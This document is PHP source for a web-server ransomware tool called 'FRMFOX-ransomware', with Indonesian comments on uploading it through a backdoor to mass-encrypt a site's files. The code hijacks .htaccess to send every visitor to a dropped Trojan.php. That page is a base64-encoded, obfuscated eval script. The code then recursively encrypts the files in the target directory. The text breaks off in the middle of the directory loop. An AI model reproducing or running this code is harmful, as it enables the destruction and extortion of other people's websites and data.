<!DOCTYPE html>
<?php

//* ##################################################################################################################
//*		RANSOMWARE POST BY FRMFOX-PLOITECH 															   #
//*		save dengan nama ransomware.php    																   #
//* 	Cara pakai : upload sc ransoware melalui backdoor kalian lalu set password encrypt terserah lalu lock    #
//*		Ransomware akan auto buat .htaccess dan Encrypt.php sebagai tampilan index web yg telah diencrypt . #
//*		kalo mau mass encrypt , taro di public_html . klo gak , taro di dir target lo utk encrypt files			   #
//*		Untuk cara decrypt kurang lebih sama kaya encrypt nya . 											#
//* 	HAPPY ENCRYPTING ^_^																			 #
//*		Greetz : All Indonesian Defacer && Cracker Attacker Team										    #
//* ##################################################################################################################


?>
<html>

<head>
<link rel="icon" type="image/gif" href="https://i.ibb.co/PwYBRTH/20200521-014413.png">
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
   <title>FRMFOX-ransomeware</title>
<style type="text/css">
body {
    background: #000;
	background-image: url('https://i.ibb.co/M8KzqvX/frm-thenight.gif');
    background-size: cover;background-repeat:no-repeat;
    color: #e2e2e2;
}
.inpute{
	width : 500px;
	height: 20px;
    border-color: #EA2A14;
    background-color: black;
    color: lime;
    text-align: center;
}
.selecte{
    border-color: lime;
	width : 300px;
	height: 20px;
    background-color: black;
    color: lime;
}
.submite{
	width:200px;
    border-color: #EA2A14;
    background-color: black;
    color: red;
}
.result{
  text-align: left;
}
</style>
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaencrypted")){
      rename(".htaccess", ".htaencrypted");
      if(fwrite(fopen('.htaccess', 'w'), "#Cracker Ransomware\r\nDirectoryIndex Trojan.php\r\nErrorDocument 404 /Trojan.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("Trojan.php", base64_decode("PGh0bWw+CjxoZWFkPgo8L2hlYWQ+Cjxib2R5PgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgo8IS0tIApldmFsKHVuZXNjYXBlKCclNjYlNzUlNmUlNjMlNzQlNjklNmYlNmUlMjAlNzclNjElMzElMzElNjElNjElMzIlMzUlMzklMjglNzMlMjklMjAlN2IlMGElMDklNzYlNjElNzIlMjAlNzIlMjAlM2QlMjAlMjIlMjIlM2IlMGElMDklNzYlNjElNzIlMjAlNzQlNmQlNzAlMjAlM2QlMjAlNzMlMmUlNzMlNzAlNmMlNjklNzQlMjglMjIlMzglMzYlMzclMzUlMzYlMzglMzIlMjIlMjklM2IlMGElMDklNzMlMjAlM2QlMjAlNzUlNmUlNjUlNzMlNjMlNjElNzAlNjUlMjglNzQlNmQlNzAlNWIlMzAlNWQlMjklM2IlMGElMDklNmIlMjAlM2QlMjAlNzUlNmUlNjUlNzMlNjMlNjElNzAlNjUlMjglNzQlNmQlNzAlNWIlMzElNWQlMjAlMmIlMjAlMjIlMzUlMzglMzUlMzQlMzglMzAlMjIlMjklM2IlMGElMDklNjYlNmYlNzIlMjglMjAlNzYlNjElNzIlMjAlNjklMjAlM2QlMjAlMzAlM2IlMjAlNjklMjAlM2MlMjAlNzMlMmUlNmMlNjUlNmUlNjclNzQlNjglM2IlMjAlNjklMmIlMmIlMjklMjAlN2IlMGElMDklMDklNzIlMjAlMmIlM2QlMjAlNTMlNzQlNzIlNjklNmUlNjclMmUlNjYlNzIlNmYlNmQlNDMlNjglNjElNzIlNDMlNmYlNjQlNjUlMjglMjglNzAlNjElNzIlNzMlNjUlNDklNmUlNzQlMjglNmIlMmUlNjMlNjglNjElNzIlNDElNzQlMjglNjklMjUlNmIlMmUlNmMlNjUlNmUlNjclNzQlNjglMjklMjklNWUlNzMlMmUlNjMlNjglNjElNzIlNDMlNmYlNjQlNjUlNDElNzQlMjglNjklMjklMjklMmIlMmQlMzYlMjklM2IlMGElMDklN2QlMGElMDklNzIlNjUlNzQlNzUlNzIlNmUlMjAlNzIlM2IlMGElN2QlMGEnKSk7CmV2YWwodW5lc2NhcGUoJyU2NCU2ZiU2MyU3NSU2ZCU2NSU2ZSU3NCUyZSU3NyU3MiU2OSU3NCU2NSUyOCU3NyU2MSUzMSUzMSU2MSU2MSUzMiUzNSUzOSUyOCUyNycpICsgJyU0NyU2YSU3MiU3YiU3NyU0NCUxNiUxNSU0YSU2ZCU3MSU2MiU3ZiU0MSUxNyUxOCU0YSU2YiU2YiU2MiU2ZiU0YyUxNiUxNCUxYiUxMCU0NyU3ZSU2NyU3MiU3NyU2YiU0MSU0ZSU3YyU2YyU3YyU3NyU3NiU3ZiU2ZiU2MiUyZSU0MiU3MiU3NyUyMyU0MiU2MiU3ZSU2ZiU2OCU2MiU3ZCU2MyUyZSU1OCU2YiU2ZCU3YyU2NyU3ZiU2ZiU0YSUzNSU3ZiU2YiU3MiU3YSU2ZSU0NCUxNiUxNSUxYiUxNSU0NiUzZCU2ZSU2ZSU2MyU2MiU0YyUxNiUxMCU0NyU3NyU2NyU3MSU3NSUyZSU3OCU2ZSU3NiU0YiUyMCU2YSU2OSU3MCU3MSUyMCUyMyU3ZSU3NyU3NiU2ZSU0NyUyMCU2NyU3NiU2NyU2OCU2ZSUzZCU2OCU2YiU2NCUyOCUyMyU2YSU3MCU2MyU2OSU0MyUyZCU2YiU3MiU3ZiU3MiU3MSU0MCUzMCUzMSU3MSUzYiU3NiU2YiU2ZiU2YSU2ZiUzNiU2ZCU2ZiU2OSU2YiU2ZiUzYiU2ZiU3NCUzNiUzMSU3MyU2NyU3MSU2YiU3YiU2ZCUzMSU2ZCU3ZCU3YiUzMCUzOCUzYyUzOSU3NiUzMCU2MyUzNSUzNSUzOCUzOCUzZCU2MyU2YyUzNSU2MiUzOCUzNSUzOSU2ZiU2MSUzYiUzZCU2ZiUzMyUzNSUzZSU2YSUzMyUzZiUzNSUzYyU2ZSUzMSUzOSUzZSUzZiUzNSU2ZiU2MiUzYyUzMiUzMyU2MyUzZiUzOSU2MiUzMyUzNiU3ZCU3OSU3MyU3NyU3MiUzNiU2OSU2ZiU3YyU2YSU2NyU3NSU3MSUzNyU2NCU3YSU3MCU3ZCU2ZSU3ZCUzYiU3ZiU2MyU3MiU3YSU3MCU3MSU3MSUzYyU3NSU3NiU2OCUyZCU0YyUxNiUxNCU0YSU2OCU3MCU2ZSU3NyUyZSU2ZCU2ZCU2YyU3MCU3YSU3MCU3YyUyZSU0MyUyMyUyOSU2MCU3YSU2MiU2OSU3NCUyOCU0YyUxNiUxNCU0YSU2OSU2ZSU3MCU3MiU2MyU3ZCU0NCUxNiUxNSUxYiUxNSU0NiU3MSU3YSU3YSU3NiU2MyUyZSU3ZiU3ZiU3MyU2ZSU0YiUyOCU3ZSU2MyU3ZSU3ZiUzMSU2MSU3MSU3YyUyZCU0MSU2ZCU3ZCU2ZiU3YiUzYSUyNiU2MiUzNiUyZSU2ZiU0NSU3MiU2YSU3MSU3OSU4NCU2ZCU3MyU3OCU3YyU3MSU3MCU0OCU3ZSU3OCU3NyUyYiU2NiU3ZiU3ZSU3ZSU0MCUzMCUzMSUzMiUzYyU2ZCU3NiUzMSU2ZCU3YSU3MCU2OSU3MSU3NiU3MCU3ZSUzYyU2MSU3MCU3MyUzMCUzNiU2NiU0MiU0OCUzNSU3YSU1MyU1ZiU3YyU3YiU0ZSU0YiUzMCU1ZiU3NSU0OCU1YyUzMSU3MiU1ZCU0YSUzZSU0MyU0YSUzNSU0MiU0MiU0ZiU0MiU0MyU0ZiU0NyU0MiU0MyU3MSUzNiUzMCUzYyU3MyU3NCU2NyUzZCUzYyU2NiU2OSUzYyU1MCU0MyUzZCU3YyUzNyUzOSUzMyUzZSUzMCU2MyU3MSU3OSUzMSU3MiU3YyU2NSUyYSUzMiUyMyU2ZiU2MyU2OSU2MyU3MyU3MiU3ZiU0NSU4YiUyZSU2MiU0MCU2YiU3MCU3NCU2ZSU3YyUyZSU4MSU2YyU3ZiU3MCU3MSU3MCU3OCU0NSU3ZSU3MCU3NyUyYSU2NiU3YSU3ZiU3MiU0OCUzZCUzMCUzOSUzMSU2ZCU3ZSUzMSU2YyU3YSU3NSU2OCU3ZCU3ZSU3ZCU3ZiUzNCU2YyU3MCU3YiUzMCUzNyU2MCU1OCU2YSU3NSU2NSU3ZiU2ZSU2MCU3YiUzMyU1ZiUzMCU1ZSU3NSU0ZCU1ZCUzZSU1YiU1MyU0ZSU0OSUzOCU0YSUzZCU0MiU0MyU0ZiU0NyU0MiU0MyU0ZiU0ZiU0MiU3YSU0MiUzMCU2NyU3YyU1NCU3YiU1OSUzMyU3YyUzMSUzMyU1MiU3ZCUzMCU3YyUzZiUzOSUzMiUzZSUzNSU3MyU3MSU2NyU3YyU3ZiU2YiU3ZCUzMSU3ZSU3MSU2OSUyNyUzMiU3OCU2MyU2NyU3MiU0NCU4MyU0NyUzMCU3MSU3ZiU3YiU3YSU2YiU0MSUxNyUxOCU0YSU3MyU3OCU2ZSUyMyU3MSU3ZiU3YiU3YSU2YiU0NiUyYyU2NCU3ZCU3MSU3YSU0NSUyMyUzZiUzZCU3MiU3NiUzNSUzMiUzYyU3ZSU3NiUyMyU3MyU3MCU3MSU3ZCU3YyU3MiU2ZiU2OSU2ZSU0NSUyMCU0YyU0NyU2YyU3MCU3MSU3MiUyMyU2ZCU3ZCU3MiU3MCU3YyUyZSU0YiUyMyUyZCU3ZCU2ZSU2MiUyOCU0MCUxYiUxMCU3ZSU3ZiU3MyU3MyU3ZSU3YiU3ZSUxNiUxOCU3ZSU3ZiUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiU3ZSU3ZiUxYiUxMCU3ZSU3ZiUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSU3ZSU3ZSUxYiUxNSU3ZiUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSU3ZSUxNiUxOCU3ZSUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiU3ZSUxYiUxNSU3ZiUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiU3ZiUxYiUxMCU3ZSUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSU3ZSUxNyUxOCU3MyUyZiUyYSUyZiUyZiUyMiUyZiUyYyUyZSUyNiUyMyUyYyUyMiUyMiUyZiUyOCUyMyUyMyUyZSUyZCUyZSUyMiUyYSUyZiUyZSUyMiU3MyUxNiUxMCUyZCUyZiUyMiUyZiUyZSUyMCUyNiUyMyUyMiUyZSUyZSUyMyU3YiUyZiU3ZSUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyMiUyMiUyZiUyYSUyZCUxNiUxOCUyZiUyZSUyMiU3YiUyMyUyMiUyZSUyZSUyMyUyNiUyMyU3ZSUyMiU3ZSUyMiUyZSUyNiUyMyUyMiUyZSUyZSU3ZSUyYSUyZiUyZiUxYiUxNSUyZSUyMiUyYSU3ZSUyMiUyZSUyZSUyMyUyNiUyMyU3ZSUyMiUyZiUyZSU3MyUyNiUyMyUyMiUyZSUyZSUyMyU3YiUyZiUyZiUyMiUxNiUxNCUyMCUyYSUyZiUyZSUyMiU3MyU3ZSUyYSUyZiUyZiUyZSUyMyUyMiUyMiUyYSUyZiU3ZiU3MyUyMiUyZiUyYSUyZiUyZCUxYiUxNSUyYyUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyOCUyMyUyMyUyZSUyZCUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZCUxMyUxNSU3ZSUyMiUyZiUyZSUyMiUyYSUyZiUyZSU3MyUyMiUyZiUyYSUyZiUyZiUyMiUyZiU3ZiUxYiUxMCU3ZSUyZSUyMCUyMiUyZCUyYSUyZCUyZiUyMCUyZiUyYyUyMiUyOCUyZiU3ZiUxYiUxOCU3ZSU3YiU3ZSUyMyUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyMiUyMiU3ZSUyYSUyMyUyZiUyZSUyZiUyMiUyMiUyNiUyZiU3ZiUyMiUyMiUyMyUyNiUyMyUyMyUyZSUyMyUyMiU3MyU3YiU3ZSUxNyUxOCU3MyUyZiUyYSUyZiUyZiUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyZSUyMiUyZiUyYSUyZiUyZiU3MyUyZiU3ZiUyMiU3YiUyZiUyZSUyMiUyZSUyMyUyNiUyMyUyMyUyZSUyMyU3ZiUyMiUyYSUyZiUyZSUxYiUxOCUyMyUyYSUyZiUyZiUyMiUyZiU3ZiU3MyUyNiUyMyUyMiUyZSUyZSUyMyUyOCUyZiUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMCUyZSUyMyUyNiUyMyUyMyU3MyU3ZSUyZSUyMiUyYSUyZiUyZSUyMiUxYiUxNSUyNiU3ZSUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiUyZiU3YiU3ZSUyMyUyZSUyMyUyMiUyMCUyOCUyZCUyYyUyMCUyZSUyMyUyNiUyMyU3ZSU3MyU3ZSU3ZiUyMiUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUxYiUxNSUyMiUyZSUyNiUyZiUyZSUyMiUyMiUyZCUyOCUyZCUyZiUyMiUyZiUyZSUyMiUyYSUyZiUyZSUyMiUyMiU3ZSU3YiU3ZSUyMyUyZSUyMyU3ZiU3MyUyYSUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMCUyZCUyYyUyMiUyYSUyZiUyYyUxYiUxOCUyZCUyOCUyZCUyMyUyZSUyMyUyMiUyZSUyNiUyZCUyYyUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSU3ZSU3ZiUyZSUyMCUyZCUyYSUyZCUyZCUyMCUyMyUyMiUyZSUyNiUyMyUxNyUxOCUyZSUyMyUyNiUyMyU3ZSU3MyU3ZSU3ZiUyZSUyOCUyZCUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSU3MyU3YiU3ZSUxNyUxOCUyZSUyMyUyNiUyMyU3ZSUyMiUyZiUyZSU3MyU3YiU3ZSUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiU3ZiU3MyUyNiUyZCUyYyUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyYSU3ZSU3ZiU3MyUyMiUyZiUyYSUxNiUxNSUyZSUyMyUyMiUyZSUyNiUyZiUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyYyUyMCUyOCUyZCUyMiUyZSUyZSUyMyUyNiUyMyUyMyUyZSUyMyUyMiUyZSUyOCUyZCUyZSUyMiUyMiUyZiUyYSUyZiUyZiUyMiUyZiUyZSUyMiUyOCUxNiUxNCUyZSUyZSUyMyUyNiUyMyUyMyUyMCUyZiUyZSUyMiUyYSUyZiUyYyUyZSUyZSUyMyUyNiUyMyUyMyUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyZSUyZSUyMyUyNiUyMyUyMyUyZSUyMyUyMiUyMCUyOCUyZiUyZSUyMiUyMiUyZCUyOCUxNiUxNSUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyMiUyMiUyZiUyOCUyMyUyMyUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyZSUyZSUyMyUyNiUyMyUyMyUyZSUyMyUyMiUyZSUyNiUyMyUyMiUyZSUyZSUyMyUyYSUyZiUyZiUyMiUyZCUxNyUxOCU0MiUzMCU3MiU3MCU2MyU0MSU0MiUzMCU2OSU3ZCU3MSU3ZSU0YyUxMyUxNSU0NiU3YSU2NyU3MSU3MSUyMyU2YiU3MCU2ZSU2OCU0YiUyZCU2YiU3ZSU3MiU3ZSU0NSUzNSUzMCU2OSU3ZCU3MSU3ZSU3MSUzNCU2OCU3MSU3ZCU2NSU3NyU2YiU2MiU3MyU2NyU3YyUzMCU2MSU3NSU3NiUzMSU2MSU3MSU3YyU0NSU2OSU2MiU3YiU2YSU3NiU3NyU0MyU0YSU2ZCU2MyU3YSU2MiU3NCU2ZiUyOCUyZSU3ZCU2ZiU3YSU0MyUyOCU3ZCU3MiU3NyU3NyU2YiU3YyU2YiU2MyU2ZSU3ZSUyNSUyNiU3ZiU3YiU3ZSU2MyU0NiUyZCU3ZiU2ZSU3NiU3ZiUzMSU2MSU3OSU3YyUyOSU0YyUxYiUxNSU0MiU2OSU3MCU3YyU3ZiUyMiU2NCU2NyU2YyU2ZiU0YiUyMCU2YSU2OSU2ZSU3NyU2ZiU3MSU2ZSUyMCUyNiU3YyU2YiU4OCU2MyU0NiUyOCUzMiUzMyUyMCUyMyU2ZCU3ZCU3MiU3MCU3YyUyZSU0YiUyMyUyZCU3ZCU2ZSU2MiUyOCU0MCU1NyU3NSU3ZSU3YyUyZSU1NSU2ZSU2OCU3YyU2YSU3MiU2ZSUyMiU0NiU2NyU3OSU2ZiUyZSU0MCU2ZSU2YiU3MSUyMyU0MyU3MSU2ZCU3MCU3ZiU3MyU3ZSU2MyU2MiUyMiUyNiU0NyU2ZCU3MCU0MSUxNyUxOCU0MiU2OSU3MSU3YyU3MiUyMyU3OSU2YSU4NSU2MyUyMyU0NyUyZSUyZCUzOSUyOSU0YyU0MCU3YSUyNiU0NyU2ZCU3MCU0MSU0ZCU3MCU2NyU2YyU3NSU2MyU3MCUyMyUzYiU0YiUzYyUzZiUzMiU2MSUzZiU1NCU1NSUzZCU0MSUzNSUzMyUzYyU0NyUzMCU2NCU3MCU3MCU3MiU0NCU0NyU2YyU3MCU0YyU0NyUzNSU2OSU3MCU3YyU3ZiU0MCU0YSU2OCU3ZCU0MCUxYiUxOCU0NyU2YyU3MCU3MSU3MiUyMyU2OCU2ZiU2OSU2ZSUyMiU0YiUyZSUyOCU2ZiU2YyU2ZSU3YSU2MiU3MCU2MiUyZCUyMyU3ZCU2NyU4OCU2ZSUyNiU0NiUyMyUyNSUzOSUyOSUyZSU2OSU3MCU3NiU3ZCU3MCUyMyU0MyUyMyUyOCU3NSU2YiU2YiU3MiU2YiUyOCU0MCU1NSU2NiU2MiU3YSUyMyU0YiU2ZiU3MyU3MiU2MyU3NCU2ZSU2ZSUyZSU1MiU3MCUyNiU1YSU3MCU3MyU3ZCUyMiU1NSU2YiU2ZCU3ZCU2NyU3MiU2ZSU0NSUyMyUxNiUxOCUwYSUwYiU0YSU2OCU3ZCU0MCU0YSU2MCU3ZCU0NCUyMyUxNiUxOCUwYSUwYiU0YSU2YyU3MCU3MCU3MiUyZSU3YyU2ZiU4NSU2ZSU0YiUyOCUzZiUyNSUyNiU2YyU3MSU3YSU3ZCU3ZCUyNiU0NiUyMyUyNSU3ZCU2ZiU2MiUyZCU0MSU1YiU3ZCU3MyU3ZCUyNiU2YSU3NiU3ZSU3MCU3YyU3MiU2NyU3MSU3ZSUyZSU3NSU2ZSU2OCU3YyU2YSU3MiU2ZSUyMiU2NCU2ZiU3NyU2ZiU3MSUyZSU2MiU3OCU2ZSUyMyU2MyU3MSU2ZCU3MCU3ZiU3MyU3ZSU2MyU2MiUzMSU0MiU2ZCU3ZCU0YyUxNiUxNCUwNyUwZiU0NyU2OCU3ZCU3YyU3ZiUyNiU2YyU3MCU3YSU3MCU3YyU0YiUyZCU3OCU2YSU2NyU3MiU2ZSUyZCU0MSUxNiUxOCUwYSUwYiU1YiU2NyU3MSU3YiUyZSU3ZCU2OSUyNiU3YSU3MCU3MyU3ZCUyMiUzYyU3NiU2YiU3MiUzYSUyZSUzMSU2OSU3YyU3YyUzYSUyMyUzMCU3OCU3OSUzNyUyMiU2ZiU3YyU2ZiUyNiU3MCU3ZiU2NiU2ZSU3YyUyZSU2YyU2YSU3NiU2MyU3MSUyMyU2NyU3ZCU2ZSUyZSU3MSU3MSUyZSU3MiU3MCU3MCU2NSU2MyU3ZCUyNiU2MiU2YyU2MSU2ZSU3ZCU3MSU2ZiU2ZCU2ZiU3YSUxYiUxNSUwZiUwYSU2ZCU2MyU2YyU2MyU3MyU3OSU2ZSUyMiU3MiU2NiU2ZSU3ZiUyMyU2YiU2ZiU3OSU2ZiUyZSU2OCU2ZSU2ZiU3YyUyZSU2ZSU3NCU2YyU3ZCU3NyU3MyU3ZSU2MyU2YSUzMSUyMiU0YSU2MCU3ZCU0NCU1NiU2MiU3NyU2ZCU2ZiUyZSU3ZiU3MCU3ZiUyZSU2ZiU3ZCU2YiUyMyU2ZCU3MyU3YyU3YiUyZSU3MiU3MCU3MSU3OSU2NyU3MSU2ZCUyMyU2OSU3ZCU3ZCUyMiU2ZiUyNiU3OCU2MyU3NyUyZSU3ZiU3NSUyMyUxNiUxOCUwYSUwYiU3MCU2YiU2YyU3MSU3NCU2MyU3ZCUyNiU3YSU3MCU3MyU3ZCUyMiU2NCU2ZiU3NyU2ZiU3MSUzYSU0NyU2OCU3ZCU0MSUyZSU2ZCU3ZiU3MiUyNiU2ZiU3MSUyZSU3YyU3MCU3YSUyMyU3OCU2ZiU3YyU3ZSU2MyUyNiU3YSU3MSU3MyU3MCUyMyU3YSU2YSU3NiU2MyUyMiU0NiU2MCU3OCU0MSUyMiU1YyU3ZCU2ZCU3NSU2ZiU3YSUyZSU2YyU2MyU3YyUyNiU2ZiU2ZiU2MSU3MCU3YSU3NiU3ZiUyMyU3NyU3MCU3ZiU3MCUyNiU2OSU2YiU3YSU2MyU3YyUxMyUxNSUwYSUwNyU3OCU2YiU3MiU2ZSU3MCU3ZiU3MiUyZSU3MCU3YiU3ZCUyMyU3MSU3MyU2ZiU2MSU2ZiU2MiU3NiUyZSU2MiU2ZSU2OSU3ZCU3YSU3ZSU3ZiU2YiU3ZCU3NCUyMyU3ZCU2MyU3MCU3OSU2ZiU2YyU2ZSUzYyUyMyU0NiU2MCU3OCU0MSUxNyUxOCUxYiUxNSUwZiUwYSU0NyU2NCU3MCU3MCU3MiUyNiU0YyU3MSU3YSU3ZCU3ZCUyNiU0NiUyMyUyNSU3ZCU2ZiU2MiUyZCU0MSU0ZSU3ZCUyZSU1MSU3NSU3ZiUyMyU1MiU3ZCU3YiUyZSU1YSU3MCUyMiU0MiU2MyU2YyU3OCU3YSU3MyU3MiUyMyU0YyU3NyUyNiU1YSU3MSU3MyU3MCUyMyU1OSU2ZSU3NyU2NCUzNyUyMiU1ZCU3OCUyMyU1YiU3ZCU3MyU3ZCUyNiU0OSU2YSU3YSU2ZSU3ZCUyZSU1ZCU2YSU3NiU3YSUyZSU0ZCU2YiUyMyU0ZiU2MyU3NyU2ZiU3MiU2YiU2ZiUyMiU0ZiU3MyU3ZiU3NSU3NiU2MiU3MiU2YSU2ZCU2ZiU3MiU3NyU3YiUzYyUyZSU0NyU2OCU3ZCU0MSU0YSU2ZCU3YyU0YyUxMyUxNSUwYiUwNyUwNyU0NyU2YyU3MCU3MSU3MiUyMyU2ZCU3ZCU3MiU3MCU3YyUyZSU0YiUyOCU3ZCU2YiU2YSU3MiU2ZSUyOSUyZSU3OSU2YSU4NCU2MyU0YiUyZCUzYyUyZCU0MSUyZSU0YiU3MSU3NSUyNiU3ZiU3MSUyZSU3MCU2ZSU2OSU3MCU3OSU2MyU3ZCUyMiU3NyU3NSU3ZSU3YyUyZSU3NSU2ZSU2OCU3YyU2YSU3MiU2ZSU0MSUyZSU0MiU2ZCU3YyU0YyU0YSU2OSU3NSU3MSU3ZiUyZSU3YyU2YiU4OCU2YiUyMyU0NyUyZSUyNSUzZSUyZCU0MSUxNiUxOCUwYSUwYiUwNyU1OSU3ZSU3YyU2MyUzYSUyMyU3ZCU2ZSUyMyU2NSU3ZSU2MyU3MCU2NyU3MSU3ZSU2MyU2MyUyMyU3YSU2YiU2MiU3MiUyMyU3YiU3ZCU3YiUyMyU2ZCU2ZiU3YyUyMyU3OCU2ZSU2YyU3ZCU3OSU2ZiU3MCUyNiU2MiU3NiU3YSUyZSU3YSU3NSU3ZSU3ZCUyZSU2OSU2YiU3YSU2YiU3YyUyMiU3MSU2ZiU2OSU2YiU3NyU3YSUyZSU2MiU3MCU2MiUyNiU2ZSU2MyU3MSU2NyU3NyU3ZiUzMSUyMyU0MCU3ZSU3ZSUyZSU3ZiU3MCU3ZiUyZSU2NiU2MiU3YyU2ZSUyMyU3YyU3MCU3ZSUyZSU2YiU3MSU3MSU3MyU2NSU2YiUyNiU3ZiU2YSU3YiU2ZSUzMCU0YSU2OCU3ZCU0MCUxYiUxOCUwYSUwZiUwYSU3OCU2MyUyMyU2ZCU2ZiU3NCUyMyU2ZSU2MyU2MSU3ZCU3ZiU3MyU3ZiUyZSU2MiU3NiU3YSUyNiU3YSU3MSU3MyU3MCUyMyU3ZCU2ZSU2ZCU3MSU2YSU3ZSU2MyUyNiU2OSU2YiU3YSU2MyUyMyU3OSU2MiU2OSU2MyU3NyU3YiUzYSUyNiU2YiU3MSU3NSUyZSU0MCUyNiU1YSU3MCU3MyUyMyU1NyU3MyU3OSU3ZiUyMiU1ZSU2ZiU3YSUyNiU2YSU3ZiUyZSU3OCU2YiU3MiU2ZSU0NyU2OCU3ZCU3YyU3ZiUyNiU2YyU3MCU3YSU3MCU3YyU0YiUyOCU3ZCU2ZiU2MiUyMCU0MSUyNiUzYyUzMyUzZSUyZiU0YyU2NyU3YSU2YyU3MSU2NyU3YyU0NyUzNSU2OSU3MCU3YyU3ZiU0MCU0YSU2OCU3ZCU0MCUxYiUxOCUwYSUwZiUwYSU0YSU2NCUyMyU3YiU3ZCU3YiUyMyU3MCU2MyU2MyU2ZiUyNiU3MCU3ZSU3MCUyMyU2MyU3MSU3OSU2YSU3ZCU3MiU2ZiU3MSU2OSU2ZSUzNyUyZSU1YSU3MSU3MyUyNiU2YyU2MyU3YyUyZSU2YyU3NSU3MSU3ZiU2ZiU2YyU3ZSUyZSU3YiU3YyUyMiU3NCU2NyU2MiUyNiU2ZSU3NiU2ZiU2YSU3NiU0OCUzMyU2NCU1ZSU3MyU3NyU3ZSU3MiU3NSU2MiU2NiU2MiU3ZSUzNiUzYyU0MyU2OSU3YiU2ZiU2YSU3MiUzMSU2YyU3ZCU3NiU2NyUzYiUyNiU0NyU2YyU3MCU0YyU0NyU2OCU3ZCU0MSUxYiUxNSUwYiUwNyUwZiU0MiU2OCU3MiU2MyU3ZCUyNiU1YSU3MCU3MyUyMyU1MiU2ZiU3ZiUyMyU2YiU3MiUzYyUyMyU1ZCU2ZSUyMyU1NSU2YSU3NiU3YSUyNiU0ZiU2ZiU2MSU3MCU3YSU3NiU3ZiUyMyU1MiU2YiU2ZiUyZSU0YiU3MSU2ZCU3MCU3NyU3MyU3YSU2ZSU2ZiUyZSU0OSU2YiU3YSU2YiU3YyUyMiU0NyU3YyUyMyU1ZiU3MCU3ZSU3MCUyMyU1OSU2MyU2OCU3YyU2YiU3MiU2MyUzMSUxMyUxNSUwYSUwNyU0NyUzMSU2NCU3NSU3MSU3ZSU0YyUxYiUxNSUwZiUwYSU0NyU2MCU3ZCU0MCUxYiUxMCUwYSUwYiU0YSU2MCU3ZCU0NCUxNiUxNSUxYiUxNSUxNyUxOCUxMyUxNSUxNyUxOCUxYiUxNSU0MiUzMCU2YyU2MyU3MSU3ZSU2MyU3OCU0MSUxNyUxOCU0YSUzMCU2OCU3MCU2ZiU3NyU0MSUxNyUxOCUxMyUxNSUxNyUxOCU0YSUzMCU2ZSU3ZiU3NiU3YSU0MTg2NzU2ODIlMzUlMzQlMzglMzglMzUlMzAlMzUnICsgdW5lc2NhcGUoJyUyNyUyOSUyOSUzYicpKTsKLy8gLS0+Cjwvc2NyaXB0Pgo8bm9zY3JpcHQ+PGk+SmF2YXNjcmlwdCByZXF1aXJlZDwvaT48L25vc2NyaXB0PgoKPC9odG1sPg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  Trojan.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".htaencrypted") ){
        if( unlink(".htaccess") && unlink("Trojan.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> Trojan.php (Default Page)<br>';
        }
        rename(".htaencrypted", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransomware.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"Trojan.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htaencrypted") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
